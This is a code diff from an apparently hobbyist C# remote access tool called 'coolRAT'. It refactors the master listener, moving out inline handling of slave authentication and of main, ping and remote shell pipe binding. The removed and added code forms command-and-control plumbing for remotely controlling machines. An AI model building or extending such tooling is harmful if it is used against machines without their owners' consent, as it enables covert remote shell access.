@@ -24,12 +24,12 @@ namespace coolRAT.Master
 
     public static class MasterListener
     {
-        private static TcpListener ConnectionListener;
-        private static Dictionary<Guid, Client> ConnectedClients;
-        private static Action MainLoopTask;
+        public static TcpListener ConnectionListener;
+        public static Dictionary<Guid, Client> ConnectedClients;
+        public static Action MainLoopTask;
 
-        private static bool MainLoopAbort;
-        private static ConnectionSettings Settings;
+        public static bool MainLoopAbort;
+        public static ConnectionSettings Settings;
 
         public static void RunInit(ConnectionSettings settings)
         {
@@ -52,59 +52,8 @@ namespace coolRAT.Master
                     {
                         TcpConnection conn = (TcpConnection)ConnectionListener.AcceptTcpClient();
                         Console.WriteLine("[MasterListener] accept connection");
-                        string packet_raw = conn.ReadPacket();
-                        Packet packet = Packet.Deserialize(packet_raw);
-                        switch(packet.Type)
-                        {
-                            case "AuthenticateConnectionPacket":
-                                AuthenticateConnectionPacket auth_packet = AuthenticateConnectionPacket.Deserialize(packet_raw);
-                                Console.WriteLine($"Received authentication ticket from {conn.Client.Client.RemoteEndPoint}: {auth_packet.AuthenticationTicket}");
-                                if (auth_packet.AuthenticationTicket == Auth.ClientAuthenticationTicket)
-                                {
-                                    Console.WriteLine("Connection has been accepted.");
-
-                                    // Add client to the slave list
-                                    Client client = new Client(new TcpPipes(conn, null, null));
-                                    ConnectionAuthenticatedPacket authenticated_packet = new ConnectionAuthenticatedPacket(true, client.UniqueId);
-                                    conn.SendPacket(authenticated_packet);
-                                    ConnectedClients.Add(client.UniqueId, client);
-                                }
-                                else
-                                {
-                                    Console.WriteLine("Connection has been denied.");
-                                    ConnectionAuthenticatedPacket authenticated_packet = new ConnectionAuthenticatedPacket(false, Guid.Empty);
-                                    conn.SendPacket(authenticated_packet);
-                                }
-                                break;
-                            case "ConnectPipePacket":
-                                ConnectPipePacket connect_packet = ConnectPipePacket.Deserialize(packet_raw);
-                                if(!ConnectedClients.ContainsKey(connect_packet.ClientId))
-                                {
-                                    PipeConnectedPacket result_fail = new PipeConnectedPacket(connect_packet.ClientId, connect_packet.PipeType, false);
-                                    conn.SendPacket(result_fail);
-                                }
-
-                                switch(connect_packet.PipeType)
-                                {
-                                    case PipeType.Main:
-                                        Console.WriteLine($"Main pipe of client {connect_packet.ClientId} rebound successfully.");
-                                        ConnectedClients[connect_packet.ClientId].Pipes.MainPipe = conn;
-                                        break;
-                                    case PipeType.Ping:
-                                        Console.WriteLine($"Ping pipe of client {connect_packet.ClientId} rebound successfully.");
-                                        ConnectedClients[connect_packet.ClientId].Pipes.PingPipe = conn;
-                                        break;
-                                    case PipeType.Shell:
-                                        Console.WriteLine($"Shell pipe of client {connect_packet.ClientId} rebound successfully.");
-                                        ConnectedClients[connect_packet.ClientId].Pipes.ShellPipe = conn;
-                                        break;
-                                }
-                                PipeConnectedPacket result_success = new PipeConnectedPacket(connect_packet.ClientId, connect_packet.PipeType, true);
-                                conn.SendPacket(result_success);
-                                break;
-                            case "DisconnectPipePacket":
-                                break;
-                        }
+                        // Spawn a new PacketListenerLoop
+                        PacketListenerLoop.Spawn(conn, new Server_PacketHandler(conn));
                         
                     }
                     catch (Exception e)
